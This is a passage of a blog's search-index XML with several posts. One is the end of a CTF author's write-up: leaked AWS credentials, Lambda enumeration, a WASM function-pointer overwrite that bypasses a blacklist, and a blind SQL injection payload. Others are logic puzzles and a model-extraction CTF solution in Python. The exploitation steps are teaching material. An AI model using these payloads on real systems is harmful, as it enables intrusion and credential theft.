(/app/node_modules/pug-lexer/index.js:12:42) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at Object.lex (/app/node_modules/pug/lib/index.js:104:9) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at Function.loadString [as string] (/app/node_modules/pug-load/index.js:53:24) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at compileBody (/app/node_modules/pug/lib/index.js:82:18)<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>From this we can read off the AWS access keys and region, and use the AWS CLI to view the blacklist lambda function.</p>
<h3 id="Part-2-Enumerating-and-downloading-lambda-function"><a href="#Part-2-Enumerating-and-downloading-lambda-function" class="headerlink" title="Part 2: Enumerating and downloading lambda function"></a>Part 2: Enumerating and downloading lambda function</h3><p>After filling in the required information after running <code>aws config</code>, we can use these commands to list and download the lambda function:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\user&gt; aws lambda list<span class="literal">-functions</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Functions&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;FunctionName&quot;</span>: <span class="string">&quot;craft_query&quot;</span>,</span><br><span class="line">            <span class="string">&quot;FunctionArn&quot;</span>: <span class="string">&quot;arn:aws:lambda:ap-southeast-1:531845528441:function:craft_query&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Runtime&quot;</span>: <span class="string">&quot;nodejs18.x&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Role&quot;</span>: <span class="string">&quot;arn:aws:iam::531845528441:role/query&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Handler&quot;</span>: <span class="string">&quot;index.handler&quot;</span>,</span><br><span class="line">            <span class="string">&quot;CodeSize&quot;</span>: <span class="number">26889</span>,</span><br><span class="line">            <span class="string">&quot;Description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Timeout&quot;</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;MemorySize&quot;</span>: <span class="number">128</span>,</span><br><span class="line">            <span class="string">&quot;LastModified&quot;</span>: <span class="string">&quot;2023-06-06T16:15:30.000+0000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;CodeSha256&quot;</span>: <span class="string">&quot;QIiGvIQxqppAv1c2Z5oiiT3WXtpM1ODbyip1891ZkXQ=&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;<span class="variable">$LATEST</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;TracingConfig&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Mode&quot;</span>: <span class="string">&quot;PassThrough&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;RevisionId&quot;</span>: <span class="string">&quot;f032fc4f-a894-4942-8995-80f7671bb771&quot;</span>,</span><br><span class="line">            <span class="string">&quot;PackageType&quot;</span>: <span class="string">&quot;Zip&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Architectures&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;x86_64&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;EphemeralStorage&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Size&quot;</span>: <span class="number">512</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;SnapStart&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;ApplyOn&quot;</span>: <span class="string">&quot;None&quot;</span>,</span><br><span class="line">                <span class="string">&quot;OptimizationStatus&quot;</span>: <span class="string">&quot;Off&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\user&gt; <span class="built_in">wget</span> <span class="literal">-O</span> craft_query.zip <span class="string">&quot;<span class="variable">$</span>(aws lambda get-function --function-name craft_query --query &#x27;Code.Location&#x27; --output text)&quot;</span></span><br></pre></td></tr></table></figure>

<p>Extracting the zip file, we‚Äôre given 3 files: index.js, site.js, and site.wasm.</p>
<h3 id="Part-3-Function-pointer-overwrite-in-the-WASM-file-to-bypass-blacklist"><a href="#Part-3-Function-pointer-overwrite-in-the-WASM-file-to-bypass-blacklist" class="headerlink" title="Part 3: Function pointer overwrite in the WASM file to bypass blacklist"></a>Part 3: Function pointer overwrite in the WASM file to bypass blacklist</h3><p>From the lambda handler, we see that only one function is exported from the wasm file, <code>craft_query</code>. Also, the wasm is compiled using emscripten:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CraftQuery</span> = <span class="title class_">EmscriptenModule</span>.<span class="title function_">cwrap</span>(<span class="string">&#x27;craft_query&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;string&#x27;</span>]);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> username = event.<span class="property">username</span>;</span><br><span class="line"><span class="keyword">const</span> password = event.<span class="property">password</span>;</span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">CraftQuery</span>(username, password);</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>The function takes a username and password and returns a string. To analyze the wasm binary, create a test website that loads and executes <code>craft_query</code> from the wasm file for debugging with browser devtools. The JavaScript glue is designed for the node environment, so compile a test C file to wasm for the browser using Emscripten, and adapt the JavaScript glue to enable execution in a web environment.</p>
<p>The test website is located at <code>./test</code> in the github. Run <code>python3 -m http.server 80</code> in the directory to access the website.</p>
<p>We can see that <code>craft_query</code> returns an SQL statement <code>SELECT * from Users WHERE username=&quot;example&quot; AND password=&quot;example&quot;</code>. On sending an input with characters other than alphabets, the function returns <code>Blacklisted!</code>. To obtain the password of the admin user, it is obvious that some form of error-based blind SQL injection is necessary, but doing so is difficult with the blacklist in place. We must take advantage of another vulnerability to carry out SQL injection.</p>
<p>Curiously, when sending a long input for the username, the function errors out with <code>Uncaught RuntimeError: memory access out of bounds</code>. When fuzzing the length of the username parameter, at a length of 69 characters, the error changes to <code>Uncaught RuntimeError: table index is out of bounds</code>. At a length of 68 characters, the error changes again to <code>Uncaught RuntimeError: null function or function signature mismatch</code>. Upon inspection of the wasm file in the browser‚Äôs developer tools, we can see that the error occurs at the end of <code>craft_query</code> at this line:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_indirect (param i32 i32) (result i32)</span><br></pre></td></tr></table></figure>

<p>When setting a breakpoint at this line and sending legitimate parameters, stepping into this indirect call will land the program in the <code>is_blacklisted</code> function. By sending different inputs, looking at the memory via the memory inspector panel, and stepping through the code in the debugger, a few things become apparent:</p>
<ol>
<li>The flow of the program is as follows: <code>craft_query</code> calls <code>func4</code> with two parameters, the second one being a pointer to the username. The username is then loaded into the address at the first parameter, and <code>func4</code> returns. It then calls <code>func15</code> on an address, the address to the password string, and the integer 59. Then, it calls <code>is_blacklisted</code> on the username and password, and <code>func7</code> is called on both the username and password separately. If <code>func7</code> returns true for both calls, <code>is_blacklisted</code> calls <code>load_query</code> with the username and password and returns its result.</li>
<li><code>func4</code> is a loop that iterates through the string and looks for the <code>%</code> sign (37 in decimal). It then converts the next two characters into a new one. This function is a url decoder.</li>
<li><code>func15</code> is <code>strncpy</code>.</li>
<li><code>func7</code> iterates through the string to find any non-alphabetical characters, and returns false if detected.</li>
<li>The call to <code>is_blacklisted</code> is indirect and the function pointer is stored in memory.</li>
</ol>
<p>The runtime errors seen previously were the result of the function pointer being overwritten by the username. By overwriting the pointer with the <code>load_query</code> function, we can bypass the blacklist function entirely. Doing</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%02</span><br></pre></td></tr></table></figure>
<p>will overwrite the function pointer with the index of the <code>load_query</code> function in the function table 0x02 after being url decoded. Since <code>load_query</code> also takes in two string arguments, this overwrite doesn‚Äôt error out.</p>
<h3 id="Part-4-Integrating-the-overwrite-with-SQLi"><a href="#Part-4-Integrating-the-overwrite-with-SQLi" class="headerlink" title="Part 4: Integrating the overwrite with SQLi"></a>Part 4: Integrating the overwrite with SQLi</h3><p>Integrating this with a standard SQLi payload, we can craft a new payload to allow for exploitation on the server. There are a few things to take note of:</p>
<ol>
<li>Query cannot extend past 69 characters.</li>
<li>When enumerating past the 9th character, the length of padding at the end of the query must be adjusted to account for the change in number length.</li>
<li>The <code>BINARY</code> keyword must be used for case-sensitive comparison.</li>
</ol>
<p>An example payload that works is:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&quot; AND (SELECT BINARY SUBSTR(password,1,1) LIMIT 1)=&quot;P&quot; --      %02</span><br></pre></td></tr></table></figure>

<p>The full exploit script is in expl.py on the github.</p>
<h2 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h2><p>This was my first time creating a real CTF challenge. It took me quite a few days to ideate and implement, and while the result wasn‚Äôt as polished as I‚Äôd like it to be, I think I got my original vision across.</p>
<p>I was truly expecting to get absolutely hounded on during the meet-and-greet with the winners. To the participants that came over and expressed appreciation for my challenge, I cannot thank you enough. It really did make the time and effort I spent completely worth it.</p>
<p>I made this challenge because I can‚Äôt do pwn (I‚Äôm mostly a web solver, but even at that I‚Äôm pretty shit), and I feel like most people who do web don‚Äôt really dip their toes into binary exploitation, so I thought it would be funny if I just made a pretend web challenge to get them excited only to psych them out with WASM halfway through (which was why the WASM file was stored on the lambda, so they couldn‚Äôt tell only until after the files are downloaded from AWS). The challenge tags kinda ruined it though.</p>
<p>Man, I regret not making the WASM pwn part more difficult. The original idea was to do proper RE on the wasm binary and have participants craft a clear path of attack before doing anything, but many people I‚Äôve talked to managed to fuzz the vulnerability out and go from intuition alone. It‚Äôs still a hard challenge nonetheless, but I feel like the meat of the potential was lost there.</p>
<p>Some other ideas I had for the challenge were to perhaps make it so that the location to overwrite the function pointer overlapped with the minimum number of characters required to perform SQLi, so participants would have to somehow work around the added three characters in some sort of way:<br><code>admin&quot; AND &quot;%02&quot;=&quot;%02&quot; AND (SELECT BINARY SUBSTR(password,1,1) LIMIT 1)=&quot;P&quot; -- </code><br>Where the second <code>%02</code> would overwrite the function pointer. Wouldn‚Äôt have increased the difficulty by a lot, but it would‚Äôve definitely made it more interesting.</p>
<p>The challenge also kept crashing for some people. Initially I thought it was the fact that WASM couldn‚Äôt collapse its memory, so the memory was just inflating on the cloud until the function crashed, but now that I look back at it, probably not. Coupled with the fact that it only crashed for some people. I didn‚Äôt deal with challenge infra during the competition so I have no logs or statistics to go by, but I‚Äôll try to figure it out and will update this blog post once I have a semi-concrete reason.</p>
<p>I am really, really sorry to Kenneth from ATL and Charin and Wei Jie from CSIT. I was honestly just an infra disaster.</p>
<h2 id="Making-the-challenge"><a href="#Making-the-challenge" class="headerlink" title="Making the challenge"></a>Making the challenge</h2><p>The entirety of the challenge minus AWS credentials are on my github.</p>
]]></content>
      <categories>
        <category>CTF Writeups</category>
      </categories>
      <tags>
        <tag>Challenge Creation</tag>
      </tags>
  </entry>
  <entry>
    <title>No Three 1 - I&#39;ll Come Back Around</title>
    <url>/2025/02/24/no-three-1/</url>
    <content><![CDATA[<p><img src="/2025/02/24/no-three-1/no-three-1.png" alt="grid"></p>
<p>Classic <a href="https://puzz.link/rules.html?nothree">No Three rules</a> apply.</p>
<p>Solve the puzzle on <a href="https://puzsq.logicpuzzle.app/puzzle/157584">PuzzleSquare</a> or <a href="https://puzz.link/p?nothree/9/9/ne06eev82aezzo4244esaeezi86ezza486el">puzzlink</a>.</p>
]]></content>
      <categories>
        <category>Puzzles</category>
      </categories>
      <tags>
        <tag>No Three</tag>
      </tags>
  </entry>
  <entry>
    <title>I Want To Build A Cobblestone Generator [WIP]</title>
    <url>/2025/05/31/cobblestone-generator/</url>
    <content><![CDATA[<p>I want to build cobblestone generators on <strong>ALL</strong> my skyblock world islands, so that an unlimited supply of my favourite block is always a <em>stone‚Äôs</em> throw away! I can never remember where the water and lava go though‚Ä¶ mind helping me out?</p>
<p>Here‚Äôs a quick tutorial I pulled up for your reference:<br><img src="/2025/05/31/cobblestone-generator/tutorial.png" alt="tutorial"></p>
<p>Have fun, and thanks for the help!</p>
<p><strong>Island 1:</strong><br><img src="/2025/05/31/cobblestone-generator/puzzle1.png" alt="puzzle-1"><br>Solve on <a href="https://swaroopg92.github.io/penpa-edit/#m=solve&p=vVTtT/o6FP7OXzF7P9rEjfEymviBV6NBlJ94uboQUkZxk7Jq1wkZ0b/dtuAdG9PcL94sfTh9Tjk957RPo9cYcwIdWIe2A01oyc+ulKFtVmClZulh7r9RIChBRpvNZpREgoXEuCAh4VgwbvxlwWYsfMaRcRl5mGMI4U2vBxeYRgRePTy3Osvmutv856z6aNv3g8Xpc2d4/zwf/20NzeCMmwPqhNe3nRY9vUger/3mG+mS2m3EPJ8SPMfJ4/hqQ8Oe8+QvrPaV33YWODSjV2fUeGsNz89L7j7NSckFFoCgLIcFJh9J/0MTjUlpm/xB22SK3Mk7TO5T00nNO7QFlQpAVQiqZYAcCOpVgGryx9Ezx9Q+py5JuXyAthItjQ8aexrLGkcyJkxsjR2Npsaqxr5e09U41tjWWNFY02vqKqtSyS3X9MmkX/V357KJsl0gYnQaxXyBPTIlG+wJgHbneejJcGG8mhGeoShjLzQI/40geJzzZJYHTyHjpNClSDJ/Ksrly1UQasb4PJfSGlOaLUXLIEN5AfdolhI8yMwx52ydYVZY+BlihoUUTeQHL9lIJMz1UuBsiniJc7ut0na8l8AG6OHasKzu/DZpoKQJkwuUuf0wGcq7fY2SO3W1XQBgdQLBKqYi8BhlckvFWfo26j+WpdlNzbH2K6u9Iy1T2oO9Lc0Hae46Ne3vmFvkJiMI1N4t/W9lghV7k8nvclNzj61msjwXHDQI2tIRxXO2jPdLLSXJ5q6C/lcFtZ8raKQVyHj7CpRVUIEq7HcraEzed4dl/sfX5397VDZ7fTP+g8RTZ54uELpk81ov9hbx3+j6wJvnj0Sskj3WsWQLpCzZvJoldSxoSR5pWnLfyFpFzStbZZUXt9rqSN9qq0OJyxf4UhhrxpfRiXETGoIZwidGSDbCCCKKw/nJJw==&a=RZJRDgMhCETvst98rKKoZ9n0/tfok3HbpMm8UGYwsM/zsecq923lLjYvgwtcD1fYDze424JrWB1ZhXyKhtVD0+oSLfM7CWnK9GJeMwVqLqrmh9yaZhDbj3dZu1Vb1ksShXaoWJeXAb2lg9iuFML6SCIs9AIiQg6MOJLa64Ai1Bc/b1jMJCKGZhAR8iIhLzLkICK0IWRoG0TE0r8U9PodpmkjXi80NQ3j0lV2u95M+9KeaZrK26INbVEy8p5uV7RyZN8x0X/nJG/picj+FubFV/H/fb4=">Penpa (answer checking enabled)</a></p>
<p><strong>Island 2</strong>:<br><img src="/2025/05/31/cobblestone-generator/puzzle2.png" alt="puzzle-2"><br>Solve on <a href="https://swaroopg92.github.io/penpa-edit/#m=solve&p=zVTdb7pIFH33r+A3+9hJClJcIOmDn00ba+vWrtsSY0YcC3Vk2gGqwbR/e+8MdhWkzb7sZjNy7uXc8X4MHOLXlAiKHVimjXVswDJtXV32mfzpuzUKE0Zdrc1nM0bjhEdUu6ARFSThQvutjptpEnDhapexTwTBGN/0enhBWEzx1cNzq7NsrrvNv06tR9O8HyxOnjvD++f5+E9jqIenQh8wO7q+7bTYyUX2eB0032iXNm5j7geMkjnJHsdXGxb17KdgYbSvgra9IJEev9oj5601PD+vebs2JzUPGQijOlwGmnxk/Q9FOJPaNvvD3WZT15u84+x+79p7987dIquB3AZGlo1cG4yjTENXxraQa4GBLWCc3BiGoYKGYcI9ZBm4W0BD4YPCnsK6whGUwpmpsKNQV2gp7Ks9XYVjhW2FZwobas/vstlazavb6nEdLuv/xcDTgHNHMWfTOBUL4tMp3RA/QW7+YhxGClyUrmZUFCjG+QsLo78zJCItRQrbw6eIC1oZkiSdP1X18hWqSDXjYl5qaU0YK46i1FSg/FD4rEglIizcEyH4usCsSBIUiBlJQH1xEL4UM9GodJYJKbZIlqRUbbU/jvca2iB1eSauS/FsM8fNmji7cAsywtkQRHLtZndSIx5C2JpgtEpZEvqccSgpOUO9v+qPdXC7e3es4tJr56Shgz/Y+eA+gJuf1LSfM7eul40wkrVb6t/SRSv+Bs3nvcl7n69mMJ6HDg4ImxCI0zlfpruthtR2M5+g/zVB4+cJnP0EkG83gfQqJpCD/bsTOJP3/GHp//Az9p99hjY7fXPxg8T3wTJdIXRgy1qvjlbx3+j6IFrmj0Qsmz3WMbAVUga2rGagjgUN5JGmgftG1jJrWdmyq7K4ZakjfctShxKHL/Bloq25WMa/tJtIS7iWBFSL6CbRwpiRaP7rEw==&a=RZNbDkIxCET34jcfl0JfazHufxuedjAmJpxwYRja+n5/7P3y5zF/3PbLYDf3LB7wtnV5mren8ov6X35T84i9UdOLE56qR8OjKY+Gt5pF9NaKT28UB1weiEdT3OHx51ilic/Ylcdnlk9meoRqiB5ZjGaUT6LHKD46sxidnz7aP822rGlzKF20LXQChNS8cGP66YBSu5DAxaUwPFxKw8Glbsy/NCy1DQNS50bocswA9C6lZeXSus6aRGobQmoXQmoTwpBnBgz56/RKBRrqQGxqX8qnplE+5fQUad+BnpxCS7dKononvXIPLamQmDohQikju9btQHbr6xHTCS0kKodhOT0J9S6uied7C7ElGTTO2z3fETlP92a5aV7uzdJVjxbclaRZV0s4b3m9+Hf8f58v">Penpa (answer checking enabled)</a></p>
]]></content>
      <categories>
        <category>Puzzles</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Masyu 1 - Meet In The Middle</title>
    <url>/2025/02/19/masyu-1/</url>
    <content><![CDATA[<p><img src="/2025/02/19/masyu-1/masyu-1.png" alt="grid"></p>
<p>Classic <a href="https://puzz.link/rules.html?mashu">Masyu rules</a> apply.</p>
<p>Solve the puzzle on <a href="https://puzsq.logicpuzzle.app/puzzle/157417">PuzzleSquare</a> or <a href="https://puzz.link/p?mashu/9/9/039663000006f060001c9000002">puzzlink</a>.</p>
]]></content>
      <categories>
        <category>Puzzles</category>
      </categories>
      <tags>
        <tag>Masyu</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyberthon 2023 - Astockalypse (Author Writeup + Notes)</title>
    <url>/2023/08/01/cyberthon-2023/</url>
    <content><![CDATA[<p>Cyberthon is an annual CTF competition targeted towards JC students in Singapore, jointly organised by HCI, CSIT, and the DIS. This year, I had the opportunity to author a challenge for the data science category, and Astockalypse was what I came up with.</p>
<p>At the end of this writeup are my thoughts before, during and after challenge creation, and how I could‚Äôve improved from a creative and a technical standpoint.</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote>
<p>üìò Challenge description:</p>
<p>One of your agents has found a proprietary stock market prediction service after enumerating Apocalypse‚Äôs webservers!</p>
<p>Are you able to exfiltrate their prediction algorithm for ehem ‚Äúfurther analysis‚Äù before they disallow public access?</p>
</blockquote>
<p><a href="https://github.com/Iscaraca/CTF-Challenges/tree/main/cyberthon2023/astockalypse">Link to source code</a></p>
<p>The challenge involves two separate websites, one being the website exposed on Apocalypse‚Äôs end and the other a submission portal to hand your investigation results in.</p>
<p><img src="/2023/08/01/cyberthon-2023/mainpg.png" alt="Astockalypse front page"><br><img src="/2023/08/01/cyberthon-2023/mainpg2.png" alt="Submission front page"></p>
<p>(I had a field day with these backgrounds btw)</p>
<p>The former site takes in a csv file of data points, and will make a stock market price prediction for every row. The goal of the challenge is to successfully exfiltrate the model using a black-box method.</p>
<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>To extract the model, it doesn‚Äôt require much to come up with this simple three-step method:</p>
<ol>
<li>Craft and present samples to the target model. These will be your x values.</li>
<li>Get enough samples and responses, or your y values, to build a solvable system of equations with the only unknowns now being the weights w and the model architecture f.</li>
<li>Find information about f, and solve the equation to find w.</li>
</ol>
<p>What follows is the solution to the challenge, using python 3.</p>
<h3 id="Generate-CSV-to-upload"><a href="#Generate-CSV-to-upload" class="headerlink" title="Generate CSV to upload"></a>Generate CSV to upload</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error, mean_absolute_error</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> preprocessing</span><br><span class="line"></span><br><span class="line">t1_range = (<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">t2_range = (<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">t3_range = (<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate 200 random sets of 3 numbers to 1dp</span></span><br><span class="line">t1 = np.<span class="built_in">round</span>(np.random.uniform(t1_range[<span class="number">0</span>], t1_range[<span class="number">1</span>], size=<span class="number">200</span>), <span class="number">1</span>)</span><br><span class="line">t2 = np.<span class="built_in">round</span>(np.random.uniform(t2_range[<span class="number">0</span>], t2_range[<span class="number">1</span>], size=<span class="number">200</span>), <span class="number">1</span>)</span><br><span class="line">t3 = np.<span class="built_in">round</span>(np.random.uniform(t3_range[<span class="number">0</span>], t3_range[<span class="number">1</span>], size=<span class="number">200</span>), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">query_df = pd.DataFrame(&#123;<span class="string">&#x27;t1&#x27;</span>: t1, <span class="string">&#x27;t2&#x27;</span>: t2, <span class="string">&#x27;t3&#x27;</span>: t3&#125;)</span><br><span class="line"></span><br><span class="line">query_df.to_csv(<span class="string">&#x27;query.csv&#x27;</span>, index=<span class="literal">False</span>, header=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<h3 id="After-uploading-query-csv-and-downloading-output-csv"><a href="#After-uploading-query-csv-and-downloading-output-csv" class="headerlink" title="After uploading query.csv and downloading output.csv"></a>After uploading query.csv and downloading output.csv</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output_df = pd.read_csv(<span class="string">&#x27;output.csv&#x27;</span>, index_col=<span class="literal">None</span>, header=<span class="literal">None</span>, names=[<span class="string">&#x27;price&#x27;</span>])</span><br><span class="line"></span><br><span class="line">query_df.reset_index(drop=<span class="literal">True</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">output_df.reset_index(drop=<span class="literal">True</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Combine x and y for visualisation purposes</span></span><br><span class="line">training_dataset = pd.concat([query_df, output_df], axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(training_dataset.head())</span><br><span class="line"><span class="built_in">print</span>(training_dataset.columns)</span><br><span class="line"></span><br><span class="line">X = training_dataset.drop(<span class="string">&#x27;price&#x27;</span>, axis=<span class="number">1</span>)</span><br><span class="line">y = training_dataset[<span class="string">&#x27;price&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fit model to data</span></span><br><span class="line">model = LinearRegression()</span><br><span class="line">model.fit(X, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump as pkl file</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;model.pkl&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(model, f)</span><br></pre></td></tr></table></figure>

<p>Submitting the pkl file to the portal gives you the flag, <code>Cyberthon&#123;Ap0c4lypt1c_m4rk3t_cr45h!!!!!&#125;</code>.</p>
<h2 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h2><p>When I was asked to make a data science challenge for Cyberthon, I was kinda hesitant to do so. I remember being a participant in Cyberthon 3 years back, wondering why data science was even a category in a CTF competition. The standard for challenges of this category over the years has been kaggle-style problem statements, with metric-based grading systems for the models. The minor gripe I had with these problem statements was that they were scarcely related to cybersecurity if at all, and I could see participants being sceptical about the challenges and their relevance to their learning.</p>
<p>Because of this, I started to research on adversarial machine learning techniques (<a href="https://en.wikipedia.org/wiki/Adversarial_machine_learning">the wikipedia</a> was a big help) and making wild storylines and ideas in my head for every possible attack strategy. Model extraction was by far the most feasible to implement, and I immediately set to work on a proof-of-concept.</p>
<p>In the outset, the challenge relied very heavily on published attack strategies and required a respectable deal of research to solve. I got pretty carried away with what was possible that for a large portion of the initial creation I failed to take into account the target demographic and aim for the challenge, which was to introduce the possibilities data science had in launching cyberattacks without being too intimidating. I quickly double-backed on the original idea and came up with the simplest idea I could think of, which is the final product you see above.</p>
<p>Having been a blur JC student previously also really helped put the difficulty into perspective. During the competition, I was glad to see that over 40 teams managed to solve Astockalypse, and I hope most of those teams left with awe and eager inquisitiveness as to what else is possible in this domain.</p>
<p>In the effort to make the challenge more approchable, I gave plenty of hints and nudges as to how the participants were supposed to extract the model via the 3 step process. In hindsight, this decision was very much regrettable. Coming up with the steps by oneself and seeing it work is undoubtedly an essential part of the learning process, and it being taken away from some participants did take away from the whole challenge of it all. Next time I make a challenge like this, I‚Äôll be sure to get plenty of feedback from not just my friends who have plenty of experience in programming and cybersecurity, but also people new to the sport to gauge the level of difficulty I should set the challenge at.</p>
<p>Thank you to everyone who came down to watch me share the solution to the challenge during the Cyberthon meet-and-greet. It was a pleasure talking to some of you.</p>
<h2 id="Making-the-challenge"><a href="#Making-the-challenge" class="headerlink" title="Making the challenge"></a>Making the challenge</h2><p>The notebook I used to train the model is <a href="https://colab.research.google.com/drive/1rQdOvRevISmqfNSZHTnbdHrlZ3wpaOGz?usp=sharing">on colab</a>.</p>
]]></content>
      <categories>
        <category>CTF Writeups</category>
      </categories>
      <tags>
        <tag>Challenge Creation</tag>
      </tags>
  </entry>
</search>
